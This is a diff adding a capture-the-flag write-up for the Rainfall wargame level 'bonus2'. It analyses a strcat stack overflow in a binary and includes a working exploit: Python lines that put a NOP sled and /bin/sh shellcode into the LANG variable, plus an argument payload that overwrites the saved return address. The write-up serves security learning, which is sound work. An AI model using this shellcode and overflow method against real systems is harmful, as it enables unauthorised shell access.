@@ -1,0 +1,47 @@
+
+#> nm bonus2
+08049988 B language
+08048529 T main
+08048484 T greetuser
+
+#> strings bonus2
+strncpy
+memcmp
+strcat
+getenv
+LANG
+
+#> objdump
+
+The binary :
+	<main>:
+	- takes two arguments that fill in a buffer[72].
+	  First arg fills 40 chars, second fills 32.
+	- Sets global variable language to:
+	  0 -> by default
+	  1 -> if environ:$LANG=fi***
+	  2 -> if environ:$LANG=nl***
+	- calls greetuser(buffer)
+
+	<greetuser>:
+	- copies a string depending on global variable language value
+	  in a buffer[72]:
+	  0 -> "Hello "
+	  1 -> "Hyvää päivää "
+	  2 -> "Goedemiddag! "
+	- strcat <main>:buffer[72] in <gu>:buffer[72]
+
+GOAL: Buffer overflow greetuser's stack to write on it's saved EIP.
+      Put in $LANG : nl_+NOPS+SHELLCODE
+	  Write 72 chars in argument with address to NOPS_runway on EIP slot
+
+Lang.py:
+print "nl_" + "\x90"*1000 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+BoF.py:
+print "A"*40' + " " + "A"*23 + "\x70\xf7\xff\xbf" + "A"*5
+
+# Kali     : "\x70\xd6\xff\xff"
+# Rainfall : "\x70\xf7\xff\xbf"
+
+LANG=$(python Lang.py) ./bonus2 $(python BoF.py)
